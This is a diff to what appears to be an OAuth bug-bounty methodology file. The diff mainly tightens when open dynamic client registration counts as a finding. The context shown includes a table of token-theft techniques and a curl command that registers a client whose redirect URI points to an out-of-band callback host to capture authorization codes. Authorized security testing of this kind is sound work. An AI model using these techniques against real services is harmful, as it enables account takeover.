@@ -12,6 +12,8 @@ report_count: 19
 - Read-only mapping first; live authorize/token only with accounts you own.
 - No stuffing, no secret-cracking. Stolen `client_secret` from a **confidential** server app is a finding; secret in a **public** native/SPA client is usually expected (PKCE is the control).
 - STOP at draft. `state` reflected without code/token theft is Low.
+- **Pre-filter (advertised RFC 7591 DCR):** If well-known advertises `registration_endpoint` **and** a mismatched `redirect_uri` returns **400**, classify **intended-behavior** (MCP consent). Do **not** draft from own-session register→authorize. Draft only if account **B**'s `code`/`token` lands on a client B did not register. Else `HOLD_RTFS`.
+- **KILL CARD (Superhuman/Coda 2026-10-09):** advertised DCR + 400-on-mismatch + own-session token = **DO_NOT_SUBMIT**. `/whoami` 500 is error-only. `example.invalid` is RFC 2606 dummy callback, not victim delivery.
 
 ## Decision tree
 1. Discover: `/oauth/authorize`, `/connect/authorize`, `/oauth/token`, `/.well-known/openid-configuration`, `/.well-known/oauth-authorization-server`, social buttons, mobile `redirect_uri`/intents.
@@ -47,7 +49,7 @@ state nonce response_mode=web_message|form_post  scope
 | 13 | **redirect_uri not bound** | Authorize with registered URI A. Exchange the code with URI B, or omit `redirect_uri`. | Token issued. Without a leaked code this is the binding bug, not ATO yet — say which. |
 | 14 | **Refresh reuse** | Exchange RT1, receive RT2. Send RT1 again. | RT1 still returns an access token, or reuse does not revoke the family. `GET` a user resource with the new token. |
 | 15 | **Loopback on a web client** | `redirect_uri=http://127.0.0.1:<port>/cb` on a **browser** client. Native-app loopback is often spec-legal; do not report that alone. | The authorization code hits a listener you opened. |
-| 16 | **Open DCR (RFC 7591)** | `POST /register` (also `/oauth/register`, `/connect/register`, `registration_endpoint` from `/.well-known/openid-configuration`) with **your** `redirect_uris` and `token_endpoint_auth_method=none`. No auth header. | `201` + `client_id`, then an authorize of **your** test user lands `code` on **your** URI. Registration alone is not ATO — complete the exchange. `javascript:` / `data:` URIs are XSS if the AS later redirects there (`hunt-xss`). |
+| 16 | **Open DCR (RFC 7591)** | `POST /register` (also `/oauth/register`, `/connect/register`, `registration_endpoint` from `/.well-known/openid-configuration`) with **your** `redirect_uris` and `token_endpoint_auth_method=none`. No auth header. First: is `registration_endpoint` advertised? Does mismatch `redirect_uri` return **400**? If both yes → **intended-behavior**, skip unless **B**. | Advertised DCR + 400 on mismatch is **not** a finding. Draft only if mismatch is **accepted** (not 400) **or** account **B**’s `code` lands on a client B did not register. Own-session authorize of your minted `client_id` is MCP consent, not ATO. `javascript:` / `data:` URIs are XSS if the AS later redirects there (`hunt-xss`). |
 
 ### redirect_uri payloads
 ```
@@ -84,7 +86,9 @@ REG=$(curl -s "$TARGET/.well-known/openid-configuration" | jq -r '.registration_
 curl -s -D - -X POST "${REG:-https://$TARGET/register}" \
   -H 'Content-Type: application/json' \
   -d '{"redirect_uris":["https://UNIQUE.oastify.com/cb"],"token_endpoint_auth_method":"none","grant_types":["authorization_code"],"response_types":["code"]}'
-# Then run authorize with the returned client_id and that redirect_uri. Code on UNIQUE = proven.
+# Then: if registration_endpoint was advertised AND a mismatched redirect_uri returns 400,
+# classify intended-behavior — do not draft unless account B's code lands on a client B did not register.
+# Own-session code on UNIQUE is MCP consent, not a finding.
 ```
 
 ### PKCE skip
@@ -108,7 +112,7 @@ curl -s -X POST https://$TARGET/oauth/token \
 - **Token/code in your control** + successful **exchange** + session **as B** (unique marker).
 - OOB: unique callback host logged the query/fragment (fragment needs JS on your page).
 - Account-link: B’s login-with-IdP now signs **A** in.
-- Open DCR: minted `client_id` + **your** test-user `code` on the registered URI. A 201 from `/register` with no authorize is not ATO.
+- Open DCR: advertised RFC 7591 `registration_endpoint` + **400** on `redirect_uri` mismatch = **intended-behavior**. Do not draft unless **cross-user** code delivery with account **B**. A 201 from `/register` plus your own authorize is not ATO.
 - `client_secret` in SPA/APK = expected for public clients unless you also skip PKCE or mint tokens for **other** users.
 - JSON-parse errors; never substring `access_token` inside AADSTS claims.
 
@@ -122,7 +126,7 @@ curl -s -X POST https://$TARGET/oauth/token \
 | Loose postMessage | Dirty dancing | Token to parent window |
 | SAML then OAuth | `hunt-saml` XSW | Admin token |
 | Unverified email | Password grant | Skip verify (`hunt-auth-bypass`) |
-| Open DCR | Authorize as your user with the minted `client_id` | Code/token to your URI |
+| Open DCR | Only if mismatch `redirect_uri` is accepted, or **B**’s code on a client B did not register | Code/token theft |
 
 ## Pattern citations (public)
 Semrush IDN H1 #861940; pixiv `../` H1 #1861974 ($2k); Slack suffix H1 #2575; Booking.com + Salt Labs 2023; Expo `returnUrl` CVE-2023-28131; Azure AD nOAuth (Descope 2023); Pass-the-token (Salt Labs); Zoom dirty dancing ($15k, 2024); Detectify dirty dancing 2022.
